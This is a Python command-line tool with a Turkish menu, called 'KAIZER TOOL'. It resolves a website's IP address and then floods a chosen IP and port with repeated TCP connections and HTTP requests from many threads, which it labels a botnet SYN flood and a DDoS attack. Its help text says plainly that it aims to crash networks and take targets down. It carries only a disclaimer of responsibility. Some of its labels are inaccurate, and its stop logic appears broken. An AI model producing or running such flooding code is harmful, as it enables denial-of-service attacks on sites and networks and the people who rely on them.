import socket
import threading
import netifaces
import time
import sys
import pyfiglet
from colorama import Fore
from urllib.parse import urlparse
import random
import queue

class Bot:
    def __init__(self, target_ip, target_port, attack_queue):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_queue = attack_queue

    def syn_flood_attack(self):
        while True:
            try:
                src_port = random.randint(1024, 65535)
                syn_packet = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nPort: {src_port}\r\n\r\n"
                bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                bot_socket.connect((self.target_ip, self.target_port))
                bot_socket.sendall(syn_packet.encode())
                bot_socket.close()
                self.attack_queue.put(1)
            except Exception as e:
                print(Fore.RED + f"  Hata Oluştu: {e}\n")
                break

def visualize_attack_status(attack_queue, max_attack):
    attack_counter = 0
    while attack_counter < max_attack:
        try:
            attack_queue.get(timeout=2)
            attack_counter += 1
            print(Fore.CYAN + f"  Saldırı Devam Ediyor: {attack_counter}/{max_attack} paket gönderildi\n")
        except queue.Empty:
            break
    print(Fore.GREEN + "  Saldırı tamamlandı. Ana menüye dönülüyor...")
    main_menu()

def create_botnet(target_ip, target_port, bot_count, max_attack):
    attack_queue = queue.Queue()
    bots = []
    for i in range(bot_count):
        bot = Bot(target_ip, target_port, attack_queue)
        bot_thread = threading.Thread(target=bot.syn_flood_attack)
        bot_thread.daemon = True
        bot_thread.start()
        bots.append(bot)
    
    threading.Thread(target=visualize_attack_status, args=(attack_queue, max_attack)).start()

def slow_print(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.014)
    print()

def figlet():
    ascii_art = pyfiglet.figlet_format("         KAIZER\n               TOOL")
    print(Fore.GREEN)
    slow_print(ascii_art)

def print_warning():
    print(Fore.RED + """    DİKKAT! YAPILAN İŞLEMLER İÇİN SORUMLULUK KABUL
                     ETMİYORUZ.""")
    time.sleep(2)

def print_menu():
    print(Fore.GREEN + "  [1] IP Bilgilerini Göster")
    print(Fore.GREEN + "  [2] Linkten IP Adresini Al")
    print(Fore.GREEN + "  [3] Ağ Saldırısı Yap")
    print(Fore.GREEN + "  [4] DDoS Saldırısı Yap")
    print(Fore.GREEN + "  [5] Bu Tool Ne İşe Yarar?")
    print(Fore.GREEN + "  [6] Çıkış Yap")

def get_local_ip_addresses():
    ip_addresses = []
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
        if addresses:
            for address_info in addresses:
                if 'addr' in address_info:
                    ip_addresses.append(address_info['addr'])
    return ip_addresses

def print_local_ip_addresses():
    print(Fore.GREEN + "  Yerel IP Adresleriniz:")
    ip_addresses = get_local_ip_addresses()
    if ip_addresses:
        for ip in ip_addresses:
            print(Fore.YELLOW + f"  {ip}\n")
    else:
        print(Fore.RED + "  Yerel IP adresi bulunamadı.")

def get_ip_from_url(url):
    try:
        parsed_url = urlparse(url)
        if parsed_url.netloc:
            return socket.gethostbyname(parsed_url.netloc)
        else:
            raise ValueError("Geçersiz URL")
    except Exception as e:
        print(Fore.RED + f"  Hata: {e}")
    return None

def print_external_ip_address():
    input_url = input(Fore.GREEN + "  Site URL'sini Girin: ")
    ip_address = get_ip_from_url(input_url)
    if ip_address:
        print(Fore.CYAN + f"  Site IP Adresi: {ip_address}\n")

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def is_valid_port(port):
    try:
        port = int(port)
        return 0 < port <= 65535
    except ValueError:
        return False

def get_valid_ip():
    while True:
        ip = input(Fore.GREEN + "  Hedef IP Adresini Girin: ")
        if is_valid_ip(ip):
            return ip
        else:
            print(Fore.RED + "  Geçersiz IP adresi! Lütfen doğru IP Adresi Girin.")

def get_valid_port():
    while True:
        port = input(Fore.GREEN + "  Hedef Port Numarasını Girin: ")
        if is_valid_port(port):
            return int(port)
        else:
            print(Fore.RED + "  Geçersiz Port Numarası! Lütfen doğru Port Numarası Girin.")

def ddos(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode("ascii"), (target_ip, target_port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode("ascii"), (target_ip, target_port))
            s.close()
            print(Fore.GREEN + f"  DDoS Saldırısı Başlatıldı: Hedef: {target_ip}:{target_port}")
        except Exception as e:
            print(Fore.RED + f"  DDoS Saldırısı Başlatılamadı: Hedef: {target_ip}:{target_port}: {e}")

def ddos_menu():
    target_ip = input(Fore.GREEN + "  Hedef IP Adresini Girin: ")
    target_port = int(input(Fore.GREEN + "  Hedef Port Numarasını Girin: "))
    packet_count = int(input(Fore.GREEN + "  Kaç Kez Gönderilsin: "))
    ddos(target_ip, target_port, packet_count)
    print(Fore.GREEN + "  DDoS Saldırısı Tamamlandı.\n")
    main_menu()

def attack_menu():
    global attack_ongoing
    global attack_counter
    global max_attack
    target_ip = get_valid_ip()
    target_port = get_valid_port()
    bot_count = int(input(Fore.GREEN + "  Bot Sayısını Girin: "))
    max_attack = int(input(Fore.GREEN + "  Saldırı Kaç Paket Gönderildiğinde Durdurulsun: "))

    print(Fore.CYAN + "  Botnet Saldırısı Başlatılıyor...")
    print(Fore.CYAN + f"  Hedef IP: {target_ip}")
    print(Fore.CYAN + f"  Hedef Port: {target_port}")
    print(Fore.CYAN + f"  Bot Sayısı: {bot_count}")
    print(Fore.CYAN + f"  Saldırı Kaç Paket Gönderildiğinde Durdurulsun: {max_attack}")

    attack_ongoing = True
    create_botnet(target_ip, target_port, bot_count, max_attack)

    while attack_ongoing and (max_attack is None or attack_counter < max_attack):
        pass
        


def main_menu():
    global attack_ongoing
    global attack_counter
    global max_attack
    while True:
        time.sleep(2)
        print_menu()
        choice = input(Fore.GREEN + "  ~$ ")
        if choice == "1":
            print_local_ip_addresses()
        elif choice == "2":
            print_external_ip_address()
        elif choice == "3":
            attack_menu()
        elif choice == "4":
            ddos_menu()
        elif choice == "5":
            print(Fore.CYAN + """
  Bu Araç, Ağ Saldırıları Ve DDoS Saldırılarını
  Gerçekleştirmek İçin Kullanılabilir.

  [1] Kullanılan Wifi IP'sini Getirir.
  
  [2] https ile Başlayan URL Girildiğinde, 
  Sitenin IP Adresini Alır.
  
  [3] Ağ Saldırıları Gerçekleştirir, Veri Tüketimini
  Artırır Veya Ağa Çökme Yapar.
  
  [4] DDoS Saldırısı Başlatır, Belirtilen
  Hedefi Çökertir.
  
  [5] Port İstendiğinde 80, 8080, 443 Portları
  Deneyebilirsiniz.
""")
        elif choice == "6":
            print(Fore.YELLOW + "  Çıkış Yapılıyor...")
            time.sleep(2)
            attack_ongoing = False
            sys.exit()
        else:
            print(Fore.RED + "  GEÇERSİZ SEÇİM!")

if __name__ == "__main__":
    attack_ongoing = False
    attack_counter = 0
    max_attack = None
    print_warning()
    figlet()
    main_menu()
    
    
